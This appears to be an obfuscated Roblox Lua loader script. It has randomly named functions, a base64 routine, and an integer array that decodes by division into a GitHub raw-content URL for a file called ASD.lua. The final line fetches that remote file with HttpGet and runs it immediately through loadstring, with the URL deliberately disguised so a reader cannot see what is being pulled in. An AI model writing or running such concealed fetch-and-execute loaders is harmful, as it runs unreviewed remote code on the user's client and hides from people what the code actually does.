local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function XiLbgShbABTIujmJXdyCRIpVmhAxNKCTIRifzEjgjjwvePVrDPzZOGAFylNtzVhmQOlRhKdnHbfogHvxKjhhodSehyHzoh(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


function DWvyHVDjKSTHoYwtrdnjelRpylUApJZaGUnWVAMZBnVkBJXeobmtRbmCHJydQJfamUzTAybSsKGoiRNVrqHDCvribAStnxJF(c)
tab={}
for i = 1,#c do
x=string.len(c[i]) 
y=string.char(x)
table.insert(tab,y)
end
x=table.concat(tab)
return x
end 


function lwbFLcPhmBZidMGSHXg(code)res=DWvyHVDjKSTHoYwtrdnjelRpylUApJZaGUnWVAMZBnVkBJXeobmtRbmCHJydQJfamUzTAybSsKGoiRNVrqHDCvribAStnxJF({})for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


loadstring(game:HttpGet(lwbFLcPhmBZidMGSHXg({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,6825,8715,8715,7665,8715,8820,6825,8715,7140,4935,6825,8715,7140,4935,11445,10185,11025,11550,4935,6825,8715,7140,4830,11340,12285,10185})))()